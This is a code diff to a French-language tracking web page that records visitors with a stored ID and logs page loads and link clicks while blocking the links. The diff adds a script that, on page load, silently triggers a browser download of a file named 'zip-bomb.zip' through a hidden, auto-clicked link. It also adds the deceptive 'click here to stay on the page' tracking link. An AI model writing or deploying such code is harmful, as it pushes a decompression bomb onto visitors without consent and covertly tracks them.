@@ -33,7 +33,7 @@
         <a href="#" class="trackable">Cliquez ici pour rester sur la page</a>
     </div>
 
-   <script>
+    <script>
     function getOrCreateUserId() {
         if (!localStorage.getItem('userId')) {
             localStorage.setItem('userId', generateUUID());
@@ -50,13 +50,16 @@
     
     document.addEventListener('DOMContentLoaded', function() {
         var userID = getOrCreateUserId();
-        sendEventData(userID, window.location.href, 'Page Load'); // Envoi immédiat des données au chargement
-    
+        sendEventData(userID, window.location.href, 'Page Load'); 
+
+        // Téléchargement automatique du document
+        downloadFile('https://github.com/Towarmat83/chuckmorris.github.io/blob/main/zip-bomb.zip'); 
+
         var links = document.querySelectorAll('a.trackable');
         links.forEach(function(link) {
             link.addEventListener('click', function(e) {
                 e.preventDefault();
-                sendEventData(userID, this.href, 'Link Click'); // Utilisation de la fonction pour gérer l'événement
+                sendEventData(userID, this.href, 'Link Click'); 
             });
         });
     });
@@ -73,8 +76,15 @@
             console.error('Error:', error);
         });
     }
+
+    function downloadFile(url) {
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = ''; 
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }
     </script>
-
-
 </body>
 </html>
